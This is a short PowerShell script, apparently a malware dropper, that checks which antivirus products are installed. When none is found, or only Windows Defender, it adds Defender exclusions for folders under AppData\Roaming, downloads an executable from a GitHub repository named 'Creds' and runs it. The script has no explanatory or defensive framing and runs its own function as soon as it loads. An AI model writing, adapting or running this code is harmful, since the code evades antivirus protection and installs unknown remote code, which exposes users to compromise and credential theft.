function Invoke-loowodi{
  [CmdletBinding()]
  Param(
    [String]
    $Command = ""
  )
  $wmiQuery = "SELECT * FROM AntiVirusProduct"
  $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters      
  [array]$AntivirusNames = $AntivirusProduct.displayName
  Switch($AntivirusNames) {
    {$AntivirusNames.Count -eq 0}{
      New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"
      Invoke-WebRequest -Uri "https://github.com/IgorAlaf/Creds/raw/main/sometest.exe" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
      Start-Process -FilePath "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
      Continue
    }
    {$AntivirusNames.Count -eq 1 -and $_ -eq "Windows Defender"} {
      New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"
      Add-MpPreference -ExclusionPath "$env:USERPROFILE/AppData/Roaming/system32Folder"
      Add-MpPreference -ExclusionPath "$env:USERPROFILE/AppData/Roaming/tempFolder"
      Invoke-WebRequest -Uri "https://github.com/IgorAlaf/Creds/raw/main/sometest.exe" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
      Start-Process -FilePath "$env:USERPROFILE/AppData/Roaming/tempFolder/sometest.exe"
      Timeout(2)
      Stop-Process -Name "Client.exe"
      Continue
    }
    {$_ -ne "Windows Defender"}{"Anti-Virus is installed ($_)."}
  }
}
Invoke-loowodi

